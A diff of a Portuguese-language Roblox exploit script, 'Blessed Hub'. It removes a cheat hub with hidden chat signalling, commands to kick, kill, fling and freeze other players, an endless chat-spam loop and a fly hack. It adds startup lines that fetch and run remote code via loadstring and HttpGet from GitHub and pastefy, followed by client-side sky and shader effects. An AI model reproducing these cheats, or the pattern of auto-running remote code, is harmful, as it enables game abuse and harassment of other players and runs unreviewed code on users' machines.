@@ -1,485 +1,55 @@
--- Serviços do Roblox
-local Players = game:GetService("Players")
-local TextChatService = game:GetService("TextChatService")
-local StarterGui = game:GetService("StarterGui")
-local CoreGui = game:GetService("CoreGui")
-local Workspace = game:GetService("Workspace")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local TweenService = game:GetService("TweenService")
-local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
-local Debris = game:GetService("Debris")
-local SoundService = game:GetService("SoundService")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
-local VoiceChatService = game:GetService("VoiceChatService")
+local loadACLAutomatically = true
 
--- =====================================================
--- 1. SISTEMA DE IDENTIFICAÇÃO DE USUÁRIOS
--- =====================================================
-
--- 🚨 Configuração de Donos e Moderadores
-local DONOS = {
-    ["Gr3g0rilsir"] = true,
-    ["Itz_guiix3"] = true,
-    ["BlessedTeam_BT"] = true
-}
-
-local MODS = {
-    ["reze167"] = true,
-}
-
-local TEMP_MODS = {}
-
--- Tabela que armazenará os usuários ativos do Blessed Hub no servidor
-local BLESSED_USERS = {}
-
--- Funções de verificação de cargo
-local function IsDono(n) return DONOS[n] == true end
-local function IsMod(n) return MODS[n] == true end
-local function IsTempMod(n) return TEMP_MODS[n] == true end
-local function IsAutorizado(n) return IsDono(n) or IsMod(n) or IsTempMod(n) end
-
--- Verificação do tipo de usuário LOCAL
-local playerName = LocalPlayer.Name
-local isDono = IsDono(playerName)
-local isMod = IsMod(playerName)
-local isTempMod = IsTempMod(playerName)
-local isAutorizado = IsAutorizado(playerName)
-
--- Sistema de anúncio e descoberta de usuários Blessed
-local function AnnouncePresence()
-    -- Envia uma mensagem invisível para outros clientes do script
-    -- Usando um caractere invisível para tornar a mensagem discreta
-    if TextChatService.TextChannels.RBXGeneral then
-        local invisibleChar = string.char(0xE000) -- Caractere invisível Unicode
-        TextChatService.TextChannels.RBXGeneral:SendAsync(invisibleChar .. "!BLESSED_USER_JOINED_" .. LocalPlayer.Name .. invisibleChar)
-    end
-end
-
--- Listener para receber anúncios de outros usuários
-TextChatService.OnIncomingMessage = function(message)
-    local msgText = message.Text
-    local speaker = Players:GetPlayerByUserId(message.TextSource.UserId)
-
-    -- Verifica se a mensagem é um anúncio de usuário Blessed
-    if msgText:find("!BLESSED_USER_JOINED_") then
-        local joiningPlayerName = msgText:match("!BLESSED_USER_JOINED_(.+)") or msgText:match("!BLESSED_USER_JOINED_(.+)") or ""
-        -- Remove caracteres invisíveis
-        joiningPlayerName = joiningPlayerName:gsub(string.char(0xE000), "")
-        
-        local player = Players:FindFirstChild(joiningPlayerName)
-        if player and player ~= LocalPlayer then
-            BLESSED_USERS[player.Name] = true
-            if isAutorizado then -- Notifica apenas admins sobre novos usuários
-                notify("Blessed Hub", player.Name .. " é um usuário Blessed.", 2)
-            end
-        end
-    end
-    
-    -- Listener de mensagens $$$ para executar comandos localmente (se for admin)
-    if isAutorizado and msgText:sub(1,3) == "/" then
-        local args = string.split(msgText," ")
-        local command = args[1]:sub(4):lower()
-        local target = args[2]
-
-        if command == "kick" then Kick(target) end
-        if command == "kill" then Kill(target) end
-        if command == "killplus" then KillPlus(target) end
-        if command == "fling" then Fling(target) end
-        if command == "freeze" then Freeze(target) end
-        if command == "verifique" then Verifique() end
-        if command == "timeoutroblox" then TimeoutRoblox() end
-    end
-end
-
--- Remove o usuário da lista quando ele sai do servidor
-Players.PlayerRemoving:Connect(function(player)
-    if BLESSED_USERS[player.Name] then
-        BLESSED_USERS[player.Name] = nil
-        if isAutorizado then
-            notify("Blessed Hub", player.Name .. " (usuário Blessed) saiu do servidor.", 2)
-        end
-    end
-end)
-
--- Anuncia a presença após um pequeno delay para garantir que o listener está ativo
-task.delay(3, AnnouncePresence)
-
--- =====================================================
--- 2. FUNÇÕES PRINCIPAIS (LÓGICA DO SCRIPT)
--- =====================================================
-
--- Função para notificar o usuário
-local function notify(title, content, duration)
-    pcall(function()
-        StarterGui:SetCore("ChatMakeSystemMessage", {
-            Text = "[Blessed Hub] " .. title .. ": " .. content;
-            Color = Color3.fromRGB(255, 100, 0);
-            Font = Enum.Font.SourceSansBold;
-            FontSize = Enum.FontSize.Size24;
-        })
-    end)
-end
-
--- Função para obter data e hora
-local function GetDateTime()
-    local now = os.date("*t")
-    return string.format("%02d/%02d/%04d - %02d:%02d:%02d", now.day, now.month, now.year, now.hour, now.min, now.sec)
-end
-
--- Função para encontrar jogador pelo nome
-local function GetPlayerByName(query)
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name:lower():sub(1, #query) == query:lower() or  
-           player.DisplayName:lower():sub(1, #query) == query:lower() then
-            return player
-        end
-    end
-    return nil
-end
-
--- Função para obter o Humanoid
-local function getHumanoid()
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    return character:WaitForChild("Humanoid")
-end
-
--- Função para copiar skin de um jogador
-local function CopyPlayerSkin(player)
-    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
-        local humanoidDescription = player.Character.Humanoid.HumanoidDescription
-        local args = {
-            [1] = humanoidDescription,
-            [2] = true
-        }
-        
-        local event = nil
-        if ReplicatedStorage:FindFirstChild("Events") then
-            event = ReplicatedStorage.Events:FindFirstChild("TryBuy")
-            if event then
-                event = event:FindFirstChild("Try")
-            end
-        end
-        
-        if event then
-            event:FireServer(unpack(args))
-            notify("Sucesso", "Skin copiada de: " .. player.Name, 3)
-        else
-            notify("Erro", "Evento de compra de skin não encontrado", 3)
-        end
-    end
-end
-
--- Função para obter IDs de itens equipados
-local function GetEquippedSkinIDs()
-    local equippedIDs = {}
-    local character = LocalPlayer.Character
-    if not character then return equippedIDs end
-
-    for _, item in ipairs(character:GetChildren()) do
-        if item:IsA("Accessory") and item:FindFirstChild("Handle") then
-            local handle = item.Handle
-            local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChildOfClass("Mesh")
-            if mesh and mesh.MeshId and mesh.MeshId ~= "" then
-                local accessoryId = mesh.MeshId:match("%d+")
-                table.insert(equippedIDs, "Acessório: " .. (accessoryId or "Sem ID") .. " (" .. item.Name .. ")")
-            else
-                table.insert(equippedIDs, "Acessório (Sem ID): " .. item.Name)
-            end
-        end
-    end
-
-    local shirt = character:FindFirstChildOfClass("Shirt")
-    if shirt and shirt.ShirtTemplate and shirt.ShirtTemplate ~= "" then
-        table.insert(equippedIDs, "Roupa (Camisa): " .. shirt.ShirtTemplate)
-    end
-
-    local pants = character:FindFirstChildOfClass("Pants")
-    if pants and pants.PantsTemplate and pants.PantsTemplate ~= "" then
-        table.insert(equippedIDs, "Roupa (Calça): " .. pants.PantsTemplate)
-    end
-
-    return equippedIDs
-end
-
--- Função para resetar skin
-local function ResetSkin()
-    local event = nil
-    if ReplicatedStorage:FindFirstChild("Events") then
-        event = ReplicatedStorage.Events:FindFirstChild("Refresh")
-    end
-    
-    if event then
-        event:FireServer()
-        notify("Sucesso", "Skin reiniciada", 3)
-    else
-        notify("Erro", "Evento de refresh não encontrado", 3)
-    end
-end
-
--- Função para teleportar para um jogador
-local function TeleportToPlayer(targetPlayer)
-    local myCharacter = LocalPlayer.Character
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
-        myCharacter.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-        notify("Teleportado", "Você foi teleportado para: " .. targetPlayer.Name, 5)
-    else
-        notify("Erro", "Não foi possível teleportar.", 5)
-    end
-end
-
--- Função para tocar música
-local currentSound = nil
-local function playMusic(songID)
-    if currentSound then
-        currentSound:Destroy()
-        currentSound = nil
-    end
-    currentSound = Instance.new("Sound")
-    currentSound.Parent = game.Workspace
-    currentSound.SoundId = "rbxassetid://" .. songID
-    currentSound.Volume = 0.5
-    currentSound.Looped = false
-    currentSound:Play()
-    notify("Música", "Tocando música ID: " .. songID, 3)
-end
-
--- Função para parar música
-local function stopMusic()
-    if currentSound then
-        currentSound:Stop()
-        currentSound:Destroy()
-        currentSound = nil
-        notify("Música Parada", "A música foi parada.", 2)
-    end
-end
-
--- Função para aplicar tag a mensagem
-local SelectedTag = nil
-local function ApplyTagToMessage(message)
-    local properties = Instance.new("TextChatMessageProperties")
-    if SelectedTag then
-        properties.PrefixText = "<font color='#ff8400'>" .. SelectedTag .. "</font> " .. message.PrefixText
-    else
-        properties.PrefixText = message.PrefixText
-    end
-    return properties
-end
-
--- Função para obter item
-local function getItem(itemName, assetId)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if backpack then
-        local success, item = pcall(function()
-            return game:GetObjects("rbxassetid://" .. assetId)[1]
-        end)
-        if success and item then
-            item.Parent = backpack
-            item.Name = itemName
-            notify("Item Obtido", "Você pegou " .. itemName .. "!", 3)
-        else
-            notify("Erro", "Este modelo pode estar indisponível: " .. itemName, 3)
-        end
-    else
-        notify("Erro", "Não foi possível pegar " .. itemName .. ".", 3)
-    end
-end
-
--- Função para equipar skin de sapo
-local function EquipSkinSapo()
-    local args = {
-        [1] = {
-            ["WalkAnimation"] = 0, ["Accessories"] = {}, ["RightLegColor"] = nil, ["MoodAnimation"] = 14618207727,
-            ["LeftLegColor"] = nil, ["JumpAnimation"] = 0, ["ProportionScale"] = 0, ["BodyTypeScale"] = 1,
-            ["ClimbAnimation"] = 0, ["LeftArmColor"] = nil, ["Face"] = 0, ["Pants"] = 0, ["RightArmColor"] = nil,
-            ["DepthScale"] = 1, ["WidthScale"] = 1, ["SwimAnimation"] = 0, ["RightArm"] = 17898082257,
-            ["GraphicTShirt"] = 0, ["Head"] = 17898084158, ["Shirt"] = 0, ["RightLeg"] = 17898082268,
-            ["RunAnimation"] = 0, ["Torso"] = 17898081687, ["FallAnimation"] = 0, ["TorsoColor"] = nil,
-            ["IdleAnimation"] = 0, ["LeftArm"] = 17898082237, ["HeadScale"] = 1, ["HeightScale"] = 1,
-            ["HeadColor"] = nil, ["LeftLeg"] = 17898081542
-        }
-    }
-    
-    local success = pcall(function()
-        local event = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
-        if event then
-            event:FireServer(unpack(args))
-            notify("Skin Equipada", "A skin 'Skin de sapo' foi equipada.", 5)
-        else
-            notify("Erro", "Evento de aplicação de skin não encontrado", 3)
-        end
-    end)
-    
-    if not success then
-        notify("Erro", "Falha ao equipar skin de sapo", 3)
-    end
-end
-
--- Função para equipar skin de capivara
-local function EquipSkinCapivara()
-    local args = {
-        [1] = {
-            ["WalkAnimation"] = 0, ["Accessories"] = {}, ["RightLegColor"] = nil, ["MoodAnimation"] = 14618207727,
-            ["LeftLegColor"] = nil, ["JumpAnimation"] = 0, ["ProportionScale"] = 0, ["BodyTypeScale"] = 1,
-            ["ClimbAnimation"] = 0, ["LeftArmColor"] = nil, ["Face"] = 0, ["Pants"] = 0, ["RightArmColor"] = nil,
-            ["DepthScale"] = 1, ["WidthScale"] = 1, ["SwimAnimation"] = 0, ["RightArm"] = 131681603005543,
-            ["GraphicTShirt"] = 0, ["Head"] = 109137349673343, ["Shirt"] = 0, ["RightLeg"] = 98454038846291,
-            ["RunAnimation"] = 0, ["Torso"] = 129341990941517, ["FallAnimation"] = 0, ["TorsoColor"] = nil,
-            ["IdleAnimation"] = 0, ["LeftArm"] = 107032747230578, ["HeadScale"] = 1, ["HeightScale"] = 1,
-            ["HeadColor"] = nil, ["LeftLeg"] = 93110795723782
-        }
-    }
-    
-    local success = pcall(function()
-        local event = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
-        if event then
-            event:FireServer(unpack(args))
-            notify("Skin Equipada", "A skin 'Skin de capivara' foi equipada.", 5)
-        else
-            notify("Erro", "Evento de aplicação de skin não encontrado", 3)
-        end
-    end)
-    
-    if not success then
-        notify("Erro", "Falha ao equipar skin de capivara", 3)
-    end
-end
-
--- Função para ativar modo Fly
-local noclip = false
-getgenv().flySpeed = 1
-local function flymode(speeds, value)
-    getgenv().flyModeSpeed = speeds or getgenv().flySpeed
-    if value == nil then
-        if getgenv().isFlyActive == nil then getgenv().isFlyActive = false end
-        getgenv().isFlyActive = not getgenv().isFlyActive
-    else
-        getgenv().isFlyActive = value
-    end
-
-    local chr = LocalPlayer.Character
-    local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
-    local function enableAllStates()
-        for _, s in ipairs(Enum.HumanoidStateType:GetEnumItems()) do
-            pcall(function() hum:SetStateEnabled(s, true) end)
-        end
-    end
-    local function disableAllStates()
-        for _, s in ipairs(Enum.HumanoidStateType:GetEnumItems()) do
-            pcall(function() hum:SetStateEnabled(s, false) end)
-        end
-    end
-
-    if not getgenv().isFlyActive then
-        enableAllStates()
-        hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
-        if chr:FindFirstChild("FlyBG") then chr.FlyBG:Destroy() end
-        if chr:FindFirstChild("FlyBV") then chr.FlyBV:Destroy() end
-        hum.PlatformStand = false
-        if chr:FindFirstChild("Animate") then chr.Animate.Disabled = false end
-        getgenv().tpwalking = false
-        return
-    end
-
-    for i = 1, getgenv().flyModeSpeed do
-        task.spawn(function()
-            local hb = game:GetService("RunService").Heartbeat
-            getgenv().tpwalking = true
-            while getgenv().tpwalking and hb:Wait() and chr and hum and hum.Parent do
-                if hum.MoveDirection.Magnitude > 0 then
-                    chr:TranslateBy(hum.MoveDirection)
-                end
-            end
-        end)
-    end
-
-    chr.Animate.Disabled = true
-    for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
-        track:AdjustSpeed(0)
-    end
-    disableAllStates()
-    hum:ChangeState(Enum.HumanoidStateType.Swimming)
-
-    local rigType = hum.RigType
-    local torso = (rigType == Enum.HumanoidRigType.R6 and chr:FindFirstChild("Torso")) or chr:FindFirstChild("UpperTorso")
-    if not torso then return end
-
-    local bg = Instance.new("BodyGyro", torso)
-    bg.Name = "FlyBG"
-    bg.P = 9e4
-    bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-    bg.cframe = torso.CFrame
-
-    local bv = Instance.new("BodyVelocity", torso)
-    bv.Name = "FlyBV"
-    bv.velocity = Vector3.new(0, 0.1, 0)
-    bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-    getgenv().currentFlyBodyVelocity = bv
-    LocalPlayer.Character.Humanoid.PlatformStand = true
-
+-- Executa o script ACL automaticamente ao iniciar (se habilitado)
+if loadACLAutomatically then
     task.spawn(function()
-        local ctrl = {f = 0, b = 0, l = 0, r = 0}
-        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
-        local speed = 0
-        local maxspeed = getgenv().flySpeed * 50
-
-        while getgenv().isFlyActive and hum.Health > 0 do
-            task.wait()
-            if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
-                speed = speed + 0.5 + (speed / maxspeed)
-                if speed > maxspeed then speed = maxspeed end
-            elseif speed > 0 then
-                speed = speed - 1
-                if speed < 0 then speed = 0 end
-            end
-            local cam = workspace.CurrentCamera
-            if ctrl.f + ctrl.b ~= 0 or ctrl.l + ctrl.r ~= 0 then
-                bv.velocity = ((cam.CFrame.LookVector * (ctrl.f + ctrl.b))
-                    + ((cam.CFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * 0.2, 0)).Position
-                    - cam.CFrame.Position)) * speed
-                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
-            elseif speed ~= 0 then
-                bv.velocity = ((cam.CFrame.LookVector * (lastctrl.f + lastctrl.b))
-                    + ((cam.CFrame * CFrame.new(lastctrl.l + lastctrl.r, (lastctrl.f + lastctrl.b) * 0.2, 0)).Position
-                    - cam.CFrame.Position)) * speed
-            else
-                bv.velocity = Vector3.new(0, 0, 0)
-            end
-            bg.CFrame = cam.CFrame * CFrame.Angles(-math.rad((ctrl.f + ctrl.b) * 50 * speed / maxspeed), 0, 0)
-        end
-        if bg then bg:Destroy() end
-        if bv then bv:Destroy() end
-        LocalPlayer.Character.Humanoid.PlatformStand = false
-        if LocalPlayer.Character:FindFirstChild("Animate") then
-            LocalPlayer.Character.Animate.Disabled = false
-        end
-        getgenv().tpwalking = false
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
+        end)
     end)
 end
 
--- Sistema de Shaders
+loadstring(game:HttpGet("https://pastefy.app/BcvfSzSS/raw", true))() -- Abertura
+
+-- Função principal dos shaders
 local function applyShaders()
+    local workspace = game:GetService("Workspace") 
+    local Lighting = game:GetService("Lighting") 
+    local RunService = game:GetService("RunService") 
+    local Debris = game:GetService("Debris") 
+    local TweenService = game:GetService("TweenService") 
+    local SoundService = game:GetService("SoundService") 
+    local Players = game:GetService("Players") 
+    local player = Players.LocalPlayer 
     local model = workspace:FindFirstChild("Model") 
+    
+    -- Som de ativação 
     local sound = Instance.new("Sound") 
     sound.SoundId = "rbxassetid://131644923" 
     sound.Volume = 1 
     sound.Parent = SoundService 
     sound:Play() 
     
+    -- Aplicar materiais ao mapa 
     if model then 
         local function setMat(obj) 
             for _, c in pairs(obj:GetChildren()) do 
-                if c:IsA("BasePart") then c.Material = Enum.Material.Basalt 
-                elseif c:IsA("Model") or c:IsA("Folder") then setMat(c) end 
+                if c:IsA("BasePart") then 
+                    c.Material = Enum.Material.Basalt 
+                elseif c:IsA("Model") or c:IsA("Folder") then 
+                    setMat(c) 
+                end 
             end 
         end 
-        if model:FindFirstChild("001_SnowStreet") then setMat(model["001_SnowStreet"]) end 
+        if model:FindFirstChild("001_SnowStreet") then 
+            setMat(model["001_SnowStreet"]) 
+        end 
         if model:FindFirstChild("Street") then 
-            for _, o in pairs(model.Street:GetDescendants()) do if o:IsA("BasePart") then o.Material = Enum.Material.Basalt end end 
+            for _, o in pairs(model.Street:GetDescendants()) do 
+                if o:IsA("BasePart") then 
+                    o.Material = Enum.Material.Basalt 
+                end 
+            end 
         end 
         for _, o in pairs(model:GetChildren()) do 
             if o:IsA("BasePart") and (o.Name == "Sidewalk" or o.Name == "Wedge") and o.Material == Enum.Material.SmoothPlastic then 
@@ -493,6 +63,177 @@ local function applyShaders()
         end) 
     end 
     
+    local soundPart = Instance.new("Part") 
+    soundPart.Size = Vector3.new(1,1,1) 
+    soundPart.Transparency = 1 
+    soundPart.Anchored = true 
+    soundPart.CanCollide = false 
+    soundPart.Parent = workspace 
+    local character = player.Character or player.CharacterAdded:Wait() 
+    local hrp = character:WaitForChild("HumanoidRootPart") 
+    
+    RunService.Heartbeat:Connect(function() 
+        if hrp and hrp.Parent then 
+            soundPart.Position = hrp.Position + Vector3.new(0,10,0) 
+        end 
+    end) 
+    
+    local fountainPart = Instance.new("Part") 
+    fountainPart.Anchored = true 
+    fountainPart.CanCollide = false 
+    fountainPart.Transparency = 1 
+    fountainPart.Size = Vector3.new(1,1,1) 
+    fountainPart.Position = Vector3.new(-27,19,15) 
+    fountainPart.Parent = workspace 
+    local attachment = Instance.new("Attachment") 
+    attachment.Position = Vector3.new(-27,19,15) 
+    attachment.Parent = fountainPart 
+    local fountainSound = Instance.new("Sound") 
+    fountainSound.Name = "FountainSound" 
+    fountainSound.SoundId = "rbxassetid://4766793559" 
+    fountainSound.Looped = true 
+    fountainSound.Volume = 0.03 
+    fountainSound.EmitterSize = 10 
+    fountainSound.RollOffMode = Enum.RollOffMode.Linear 
+    fountainSound.MaxDistance = 100 
+    fountainSound.Parent = attachment 
+    fountainSound:Play() 
+    
+    local active = false 
+    local stars = {} 
+    local shootingStarsFolder = Instance.new("Folder",workspace) 
+    shootingStarsFolder.Name = "ShootingStars" 
+    local STAR_COUNT = 300 
+    local SHOOTING_STAR_CHANCE = 0.3 
+    local SHOOTING_STAR_MAX = 12 
+    local shootingStarCooldown = 0.1 
+    local spaceSound = Instance.new("Sound",workspace) 
+    spaceSound.SoundId = "rbxassetid://1843520836" 
+    spaceSound.Volume = 0.3 
+    spaceSound.Looped = true 
+    spaceSound.Name = "SpaceAmbience" 
+    
+    local function createStar() 
+        local star = Instance.new("Part") 
+        local size = math.random(1,3)*0.5 
+        star.Size = Vector3.new(size,size,size) 
+        star.Position = Vector3.new(math.random(-1000,1000),math.random(300,700),math.random(-1000,1000)) 
+        star.Anchored = true 
+        star.CanCollide = false 
+        star.Material = Enum.Material.Neon 
+        local colors = {Color3.fromRGB(255,255,255),Color3.fromRGB(255,255,180),Color3.fromRGB(180,200,255)} 
+        star.Color = colors[math.random(1,#colors)] 
+        star.Name = "Star" 
+        star.Parent = workspace 
+        local light = Instance.new("PointLight",star) 
+        light.Brightness = 2 + math.random()*1.5 
+        light.Range = 12 
+        spawn(function() 
+            while star.Parent and active do 
+                star.Transparency = 0.2 + math.sin(tick()*math.random(2,5))*0.2 
+                RunService.Heartbeat:Wait() 
+            end 
+            if star.Parent then star:Destroy() end 
+        end) 
+        table.insert(stars,star) 
+    end 
+    
+    local function createShootingStar() 
+        if not active then return end 
+        local startPos = Vector3.new(math.random(-1000,1000),math.random(350,600),math.random(-1000,1000)) 
+        local dir = Vector3.new(math.random(-1,1),math.random(-0.1,0.1),math.random(-1,1)).Unit 
+        local speed = math.random(350,550) 
+        local isFire = math.random() <= SHOOTING_STAR_CHANCE 
+        local color = isFire and Color3.fromRGB(255,50,50) or Color3.fromRGB(255,255,220) 
+        local star = Instance.new("Part") 
+        star.Size = Vector3.new(0.5,0.5,3) 
+        star.Position = startPos 
+        star.Anchored = true 
+        star.CanCollide = false 
+        star.Material = Enum.Material.Neon 
+        star.Color = color 
+        star.Name = "ShootingStar" 
+        star.Parent = shootingStarsFolder 
+        local att0 = Instance.new("Attachment",star) 
+        local att1 = Instance.new("Attachment",star) 
+        att1.Position = Vector3.new(0,0,-3) 
+        local trail = Instance.new("Trail",star) 
+        trail.Attachment0 = att0 
+        trail.Attachment1 = att1 
+        trail.Lifetime = 0.35 
+        trail.Color = ColorSequence.new(color) 
+        trail.LightEmission = 1 
+        trail.WidthScale = NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)}) 
+        local light = Instance.new("PointLight",star) 
+        light.Brightness = isFire and 12 or 7 
+        light.Range = 35 
+        light.Color = color 
+        if isFire then 
+            local fire = Instance.new("Fire",star) 
+            fire.Heat = 15 
+            fire.Size = 3.5 
+            fire.Color = Color3.fromRGB(255,110,0) 
+            fire.SecondaryColor = Color3.fromRGB(255,210,0) 
+        end 
+        local lifetime = math.random(1,1.5) 
+        local timePassed = 0 
+        local moveConn 
+        moveConn = RunService.Heartbeat:Connect(function(dt) 
+            if not active then moveConn:Disconnect() if star.Parent then star:Destroy() end return end 
+            timePassed += dt 
+            if timePassed >= lifetime then moveConn:Disconnect() if star.Parent then star:Destroy() end return end 
+            local curve = math.sin(timePassed*20)*0.5 
+            star.Position += (dir+Vector3.new(0,curve,0)).Unit*speed*dt 
+        end) 
+        Debris:AddItem(star,4) 
+    end 
+    
+    local function updateSky() 
+        local hour = Lighting.ClockTime 
+        local shouldBeActive = hour >= 18 or hour < 6 
+        if shouldBeActive and not active then 
+            active = true 
+            Lighting.FogColor = Color3.fromRGB(10,10,30) 
+            Lighting.FogEnd = 5000 
+            Lighting.Brightness = 2 
+            for _,s in ipairs(stars) do if s and s.Parent then s:Destroy() end end 
+            stars = {} 
+            for _,p in ipairs(shootingStarsFolder:GetChildren()) do p:Destroy() end 
+            for i=1,STAR_COUNT do createStar() end 
+            spaceSound:Play() 
+        elseif not shouldBeActive and active then 
+            active = false 
+            for _,s in ipairs(stars) do if s and s.Parent then s:Destroy() end end 
+            stars = {} 
+            for _,p in ipairs(shootingStarsFolder:GetChildren()) do p:Destroy() end 
+            spaceSound:Stop() 
+            Lighting.FogColor = Color3.fromRGB(192,192,192) 
+            Lighting.FogEnd = 100000 
+            Lighting.Brightness = 2 
+        end 
+    end 
+    
+    task.spawn(function() 
+        while true do 
+            if active then 
+                for i=1,SHOOTING_STAR_MAX do 
+                    createShootingStar() 
+                    task.wait(shootingStarCooldown) 
+                end 
+            else 
+                task.wait(1) 
+            end 
+        end 
+    end) 
+    
+    task.spawn(function() 
+        while true do 
+            updateSky() 
+            task.wait(1) 
+        end 
+    end) 
+    
+    -- Iluminação e ambiente geral 
     Lighting.Brightness = 2 
     Lighting.GlobalShadows = true 
     Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70) 
@@ -525,381 +266,10 @@ local function applyShaders()
     blur.Size = 0 
 end
 
--- =====================================================
--- 3. SISTEMA DE COMANDOS DE ADMIN (VIA CHAT)
--- =====================================================
+-- Executa automaticamente ao iniciar
+applyShaders()
 
--- Função para encontrar jogador por nome ou display name
-local function FindPlayer(name)
-    name = name:lower()
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.Name:lower():sub(1, #name) == name:lower() or p.DisplayName:lower():sub(1, #name) == name:lower() then
-            return p
-        end
-    end
-    return nil
-end
-
--- Comandos locais (CORRIGIDOS para funcionar em outros usuários)
-local function Kick(playerName)
-    local target = FindPlayer(playerName)
-    if target and BLESSED_USERS[target.Name] then
-        target:Kick("Você foi removido pelo Blessed Hub.")
-        notify("Sucesso", "Você removeu: " .. target.Name, 3)
-    elseif not target then
-        notify("Erro", "Jogador não encontrado.", 3)
-    else
-        notify("Erro", "Este jogador não é um usuário Blessed.", 3)
-    end
-end
-
-local function Kill(playerName)
-    local target = FindPlayer(playerName)
-    if target and BLESSED_USERS[target.Name] then
-        local char = target.Character
-        if char then 
-            char:BreakJoints()
-            notify("Sucesso", "Você matou: " .. target.Name, 3)
-        end
-    elseif not target then
-        notify("Erro", "Jogador não encontrado.", 3)
-    else
-        notify("Erro", "Este jogador não é um usuário Blessed.", 3)
-    end
-end
-
-local function KillPlus(playerName)
-    local target = FindPlayer(playerName)
-    if target and BLESSED_USERS[target.Name] then
-        local char = target.Character
-        if char then
-            char:BreakJoints()
-            local root = char:FindFirstChild("HumanoidRootPart")
-            if root then
-                for i = 1, 10 do
-                    local part = Instance.new("Part")
-                    part.Size = Vector3.new(10,10,10)
-                    part.Anchored = false
-                    part.CanCollide = false
-                    part.Material = Enum.Material.Neon
-                    part.BrickColor = BrickColor.Random()
-                    part.CFrame = root.CFrame
-                    part.Parent = workspace
-                    local bv = Instance.new("BodyVelocity")
-                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
-                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
-                    bv.Parent = part
-                    game.Debris:AddItem(part, 3)
-                end
-            end
-            notify("Sucesso", "Você matou+ : " .. target.Name, 3)
-        end
-    elseif not target then
-        notify("Erro", "Jogador não encontrado.", 3)
-    else
-        notify("Erro", "Este jogador não é um usuário Blessed.", 3)
-    end
-end
-
-local function Fling(playerName)
-    local target = FindPlayer(playerName)
-    if target and BLESSED_USERS[target.Name] then
-        local char = target.Character
-        if char then
-            local root = char:FindFirstChild("HumanoidRootPart")
-            if root then
-                local targetCFrame = CFrame.new(50000,5000000,3972823)
-                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
-                local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
-                tween:Play()
-                notify("Sucesso", "Você flingou: " .. target.Name, 3)
-            end
-        end
-    elseif not target then
-        notify("Erro", "Jogador não encontrado.", 3)
-    else
-        notify("Erro", "Este jogador não é um usuário Blessed.", 3)
-    end
-end
-
-local function Freeze(playerName)
-    local target = FindPlayer(playerName)
-    if target and BLESSED_USERS[target.Name] then
-        local char = target.Character
-        if char then
-            for _, part in ipairs(char:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.Anchored = true
-                end
-            end
-            notify("Sucesso", "Você congelou: " .. target.Name, 3)
-        end
-    elseif not target then
-        notify("Erro", "Jogador não encontrado.", 3)
-    else
-        notify("Erro", "Este jogador não é um usuário Blessed.", 3)
-    end
-end
-
-local function Verifique()
-    local channel = TextChatService.TextChannels.RBXGeneral
-    if channel then
-        local randomNumber = math.random(1000,9999)
-        local msg = "Blessed_"..randomNumber
-        channel:SendAsync(msg)
-    end
-end
-
-local function TimeoutRoblox()
-    spawn(function()
-        local channel = TextChatService.TextChannels.RBXGeneral
-        while true do
-            if channel then
-                channel:SendAsync("##########")
-            end
-            task.wait(0)
-        end
-    end)
-end
-
--- Função de comando para trazer jogador (NOVO)
-local function BringPlayer(playerName)
-    local target = FindPlayer(playerName)
-    if not target then
-        notify("Erro", "Jogador não encontrado.", 3)
-        return
-    end
-
-    -- Verifica se o alvo é um usuário Blessed
-    if not BLESSED_USERS[target.Name] then
-        notify("Erro", "Este jogador não é um usuário Blessed.", 3)
-        return
-    end
-
-    local myChar = LocalPlayer.Character
-    if target and target.Character and myChar then
-        local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
-        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
-        if tHRP and myHRP then
-            tHRP.CFrame = myHRP.CFrame * CFrame.new(0, 0, 2) -- Offset para não ficar preso
-            notify("Sucesso", "Você puxou " .. target.Name .. " até você.", 3)
-        end
-    end
-end
-
--- Variáveis para comandos de admin
-local ColorChangeActive = false
-local savedSpawn = nil
-local spawnEnabled = false
-local loopResetActive = false
-local loopResetThread = nil
-
--- Funções de suporte para comandos de admin
-local function SetSpeed(val)
-    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-    if hum then
-        hum.WalkSpeed = tonumber(val) or 16
-        notify("Blessed Hub", "Velocidade: " .. hum.WalkSpeed, 3)
